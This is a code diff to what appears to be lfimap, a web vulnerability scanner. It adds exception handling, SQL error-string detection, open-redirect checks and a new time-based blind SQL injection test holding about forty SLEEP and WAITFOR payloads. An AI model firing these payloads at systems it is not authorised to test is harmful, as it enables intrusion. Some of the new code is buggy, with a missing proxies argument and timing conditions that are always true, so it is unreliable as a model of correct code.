@@ -112,10 +112,13 @@ def HEAD(url, headersData, proxy):
 
 def GET(url, headers, proxy, exploitType, exploitMethod, exploit = False):
     doContinue = True
-    
+    res = None
+
     #if(args.verbose and not exploit):
-    #    print("[i] Testing " + str(url))
-    #    sys.stdout.write("\033[K")
+        #print("-> Trying: " + str(url), end="\r")
+        #time.sleep(1)
+        #print("\033[1A", end = "\x1b[2K")
+    
     try:
         if(exploit):
             res = requests.get(url, headers = headers, proxies = proxy)
@@ -127,12 +130,19 @@ def GET(url, headers, proxy, exploitType, exploitMethod, exploit = False):
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...")
         lfimap_cleanup()
+    except requests.exceptions.InvalidSchema:
+        print("InvalidSchema exception detected. Server doesn't understand the parameter value.")
+    except:
+        print("Unknown exception occured. Please open up an issue on lfimap's github. Printing trace...\n")
+        raise
+
     return res, doContinue
 
 
 def POST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit = False):
     doContinue = True
-    
+    res = None
+
     #if(args.verbose and not exploit):
     #    print("[i] Testing " + str(url))
     #    sys.stdout.write("\033[K")
@@ -147,6 +157,11 @@ def POST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit 
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...")
         lfimap_cleanup()
+    except requests.exceptions.InvalidSchema:
+        print("InvalidSchema exception detected. Server doesn't understand the parameter value.")
+    except:
+        print("Unknown exception occured. Please open up an issue on lfimap's github. Printing trace...\n")
+        raise
 
     return res, doContinue
 
@@ -402,8 +417,7 @@ def test_filter(url):
     
     if(not args.postreq):
         for i in range(len(tests)):
-            if(args.param in url):
-                u = url.replace(args.param, tests[i])
+            u = url.replace(args.param, tests[i])
             _, br = GET(u, headers, proxies, "LFI", "FILTER")
             if(not br): return
     else:
@@ -550,11 +564,25 @@ def test_rfi(url):
 def test_heuristics(url):
     if(args.verbose):
         print("\n[i] Testing for info disclosure using heuristics...")
-
+    
+    #TODO
+    # First test with user provided URL -> In future when PWN will not be mandatory in the URLs.
+    # Also test with following payloads and compare these responses with original one. If one of this errors is shown in responses, flag them as positive match.
+    # If errors are shown with original user-provided URL and are shown with the following requests, flag them as false-positives.
+    #
+    # Also, test for other databases, not just mysql.
+    #
+    
     tests = []
     tests.append("/?!%$$%!?/")
     
-    errors = ["Warning", "include(", "require(", "fopen(", "fpassthru(", "readfile(", "fread(", "fgets("]
+    fiErrors = ["warning", "include(", "require(", "fopen(", "fpassthru(", "readfile(", "fread(", "fgets("]
+    sqlErrors = ["you have an error in your sql syntax", "unclosed qutation mask after the character string",
+            "you have an error in your sql syntax", "mysql_query(", "mysql_fetch_array(", 
+            "mysql_fetch_assoc(", "mysql_fetch_field(", "mysql_fetch_field_direct(", "mysql_fetch_lengths(", 
+            "mysql_fetch_object(", "mysql_fetch_row(", "mysql_fetch_all(", "mysql_prepare(", "mysql_info(",
+            "mysql_real_query(", "mysql_stmt_init(", "mysql_stmt_execute(" 
+            ]
     temp = headers.copy()
     temp['User-Agent'] = "lfimap<>ua"
     temp['Referer'] = "lfimap<>referer"
@@ -564,34 +592,48 @@ def test_heuristics(url):
         for test in tests:
             u = url.replace(args.param, test)
             res, _ = GET(u, headers, proxies, "INFO", "INFO")
-            if(errors[0] in res.text):
-                for i in range(1,len(errors)):
-                    if(errors[i] in res.text):
-                        if("C:" in res.text or "D:" in res.text or "windows" in res.text.lower()):
+            if(fiErrors[0] in res.text):
+                for i in range(1,len(fiErrors)):
+                    if(fiErrors[i] in res.text.lower()):
+                        if("c:" in res.text or "d:" in res.text.lower() or "windows" in res.text.lower()):
                             print("[i] Detected windows OS signatures, based on response.")
-                        print("[+] Possible LFI ->  error triggered -> '" + u + "'")
+                        print("[+] Info disclosure -> '" + fiErrors[i] + "' error triggered -> '" + u + "'")
                         stats["info"] += 1
                         break
+
+            # Check for Sql errors
+            for i in range(len(sqlErrors)):
+                if(sqlErrors[i] in res.text.lower()):
+                    print("[+] Info disclosure -> '" + sqlErrors[i] + "' error detected -> '" + u + "'")
+                    stats["info"] += 1
+                    break
     else:
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
             res, _ = POST(url, headers, postTest, proxies, "INFO", "INFO")
-            if(errors[0] in res.text):
-                for i in range(1, len(errors)):
-                    if(errors[i] in res.text):
+            if(fiErrors[0] in res.text):
+                for i in range(1, len(fiErrors)):
+                    if(fiErrors[i] in res.text):
                         if("/php" in res.text):
                             print("[i] Detected linux OS signatures, based on response.")
-                        print("[+] Possible LFI error triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
+                        print("[+] Info disclosure -> '" + fiErrors[i] + "' triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
                         stats["info"] += 1
                         break
 
+            # Check for Sql errors
+            for i in range(len(sqlErrors)):
+                if(sqlErrors[i] in res.text.lower()):
+                    print("[+] Info disclosure -> '" + sqlErrors[i] + "' error detected -> '" + u + "'")
+                    stats["info"] += 1
+                    break
+
     if("Server" in res.headers):
-        print("[+] Possible web server version disclosure: " + res.headers['Server'])
+        print("[+] Info disclosure -> Web server version: " + res.headers['Server'])
         stats["info"] += 1
     
     resHeaders = "".join(res.headers).lower()
     if("x-powered-by" in resHeaders):
-        print("[+] Possible disclosure of underlying web server languages discovered: " + res.headers['X-Powered-By'])
+        print("[+] Info disclosure -> Underlying web server languages: " + res.headers['X-Powered-By'])
         stats["info"] += 1
     if("phpsessid" in resHeaders):  
         print("[+] Discovered possible PHP signatures.")
@@ -613,6 +655,85 @@ def test_heuristics(url):
         stats["info"] += 1
 
     return
+
+def test_sqli(url):
+    if(args.verbose):
+        print("[i] Testing for blind SQL injection...")
+    
+    sqli = []
+    sqli.append("1;SELECT SLEEP(5)#")
+    sqli.append("1;SELECT SLEEP(5)")
+    sqli.append("1 AND SLEEP(5)")
+    sqli.append("1 OR SLEEP(5)")
+    sqli.append("1 AND SLEEP(5)#")
+    sqli.append("1 OR SLEEP(5)#")
+    sqli.append("1 RLIKE SLEEP(5)")
+    sqli.append("1 RLIKE SLEEP(5)#")
+    sqli.append("\" or sleep(5)#")
+    sqli.append("' or sleep(5)#")
+    sqli.append("\" or sleep(5)=\"")
+    sqli.append("' or sleep(5)='")
+    sqli.append("1) or sleep(5)#")
+    sqli.append("1' or sleep(5) -- -")
+    sqli.append("\") or sleep(5)=\"")
+    sqli.append("') or sleep(5)='")
+    sqli.append("1)) or sleep(5)#")
+    sqli.append("\")) or sleep(5)=\"")
+    sqli.append("')) or sleep(5)='")
+    sqli.append(";waitfor delay '0:0:5'-- -")
+    sqli.append(");waitfor delay '0:0:5'-- -")
+    sqli.append("';waitfor delay '0:0:5'-- -")
+    sqli.append("\";waitfor delay '0:0:5'-- -")
+    sqli.append("');waitfor delay '0:0:5'-- -")
+    sqli.append("\");waitfor delay '0:0:5'-- -")
+    sqli.append("));waitfor delay '0:0:5'-- -")
+    sqli.append("'));waitfor delay '0:0:5'-- -")
+    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe")
+    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='")
+    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)")
+    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- -")
+    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#")
+    sqli.append("SLEEP(5)#")
+    sqli.append("SLEEP(5)--")
+    sqli.append("SLEEP(5)=\"")
+    sqli.append("SLEEP(5)='")
+    sqli.append("or SLEEP(5)")
+    sqli.append("or SLEEP(5)#")
+    sqli.append("or SLEEP(5)--")
+    sqli.append("or SLEEP(5)=\"")
+    sqli.append("or SLEEP(5)='")
+
+    timeSum = 0
+    # GET baseline response time
+    for i in range(2):
+        if(args.postreq):
+            baselineReq = POST(url, headers, args.postreq, proxies, "SQLI", "SQLI")
+        else:
+            baselineReq, _ = GET(url, headers, proxies, "SQLI", "SQLI")
+        
+        timeSum += baselineReq.elapsed.total_seconds()
+    
+    averageTime = timeSum / 2.0
+    
+    for test in sqli:
+        if(args.postreq):
+            r, br = POST(url, headers, args.postreq.replace(args.param, test), "SQLI", "SQLI")
+        else:
+            r, br = GET(url.replace(args.param, test), headers, proxies, "SQLI", "SQLI")
+        
+        rTime = r.elapsed.total_seconds()
+        if(rTime > 5.0 and rTime < rTime + (averageTime*20/100) and rTime > rTime - (averageTime*20/100)):
+            if(args.postreq): r2, br = POST(url, headers, args.postreq.replace(args.param, test.replace("5", "7")), proxies, "SQLI", "SQLI")
+            else: r2, br = GET(url.replace(args.param, test.replace("5", "7")), headers, proxies, "SQLI", "SQLI")
+            r2Time = r2.elapsed.total_seconds()
+            if(r2Time > 7.0 and r2Time < r2Time + (averageTime*20/100) and r2Time > r2Time - (averageTime*20/100)):
+                print("[+] SQLI -> " + url.replace(args.param, test))
+                print("    Reason: response time is " + str(r.elapsed.total_seconds()) + ", while average being: " + str(averageTime))
+                stats["vulns"] += 1
+                if(not args.no_stop):
+                    return
+
+    #TODO union based sql injections
 
 
 #Checks if sent payload is executed, if any of the below keywords are in the response, returns True
@@ -1192,8 +1313,13 @@ def main():
         c = 0
         with open(args.f, "r") as fl:
             lines = fl.read().splitlines()
+            
+            # To remove duplicates
+            wordlistSet = set()
             for line in lines:
-                
+                wordlistSet.add(line.replace("\n", ""))
+
+            for line in wordlistSet:
                 print("\n[ii] Testing URL: " + str(line))
                 #Perform all tests
                 
@@ -1205,11 +1331,22 @@ def main():
                 #Check if URL line is accessible
                 try:
                     r = HEAD(line, headers, proxies)
+                    
                     if(r.status_code == 404):
                         print("[-] " + line + " is not accessible. HTTP status code " + str(r.status_code) + ". Skipping...")
                         continue
+                    
+                    if("Location" in r.headers):
+                        if(r.headers["Location"] == args.param):
+                            print("[+] Open redirection -> " + line.replace("FUZZ", "https://google.com"))
+                            stats["vulns"] += 1
+                            continue
+                
                 except requests.exceptions.ConnectTimeout:
                     print("[-] Url '" + line + "' timed out. Skipping...")
+                    continue
+                except urllib3.exceptions.NewConnectionError:
+                    print("[-] Failed to establish connection to " + line)
                     continue
                 except OSError:
                     print("[-] Failed to establish connection to " + line)
@@ -1233,6 +1370,7 @@ def main():
                     test_file_trunc(line)
                     test_trunc(line)
                     test_cmd_injection(line)
+                    test_sqli(line)
                     test_xss(line)
                     default = False        
                     continue
@@ -1264,6 +1402,9 @@ def main():
                 if(args.cmd):
                     default=False
                     test_cmd_injection(line)
+                if(args.sqli):
+                    default = False
+                    test_sqli(line)
                 if(args.xss):
                     default = False
                     test_xss(line)
@@ -1297,6 +1438,12 @@ def main():
             # PUT ALL BELOW CODE HERE
             
             if(r.status_code != 404):
+                if("Location" in r.headers):
+                    if(r.headers["Location"] == args.param):
+                        print("[+] Open redirection -> " + args.url.replace("FUZZ", "https://google.com"))
+                        stats["vulns"] += 1
+                        lfimap_cleanup()
+
                 stats["urls"] += 1
                 url = args.url
                 #Perform all tests
@@ -1310,6 +1457,7 @@ def main():
                     test_file_trunc(url)
                     test_trunc(url)
                     test_cmd_injection(url)
+                    test_sqli(url)
                     test_xss(url)
                     
                     lfimap_cleanup()
@@ -1343,6 +1491,9 @@ def main():
                 if(args.cmd):
                     default=False
                     test_cmd_injection(url)
+                if(args.sqli):
+                    default = False
+                    test_sqli(url)
                 if(args.xss):
                     default = False
                     test_xss(url)
@@ -1364,6 +1515,9 @@ def main():
         #HEAD request timed out
         except requests.exceptions.ConnectTimeout:
             print("[-] Url '" + args.url + "' timed out. Skipping...")
+        
+        except urllib3.exceptions.NewConnectionError:
+            print("[-] Failed to establish connection to " + args.url)
         except OSError:
             print("[-] Failed to establish connection to " + args.url)
         except KeyboardInterrupt:
@@ -1405,6 +1559,7 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('-c', '--cmd', action = 'store_true', dest = 'cmd', help='\t\t Attack using command injection')
     attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file:// wrapper')
     attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Test for reflected XSS')
+    attackGroup.add_argument('--sqli', action= 'store_true', dest= 'sqli', help='\t\t Test for SQL injection')
     attackGroup.add_argument('--info', action= 'store_true', dest= 'heuristics', help= '\t\t Test for basic information disclosures')
     attackGroup.add_argument('-a', '--all', action = 'store_true', dest = 'test_all', help='\t\t Use all available methods to attack')
     
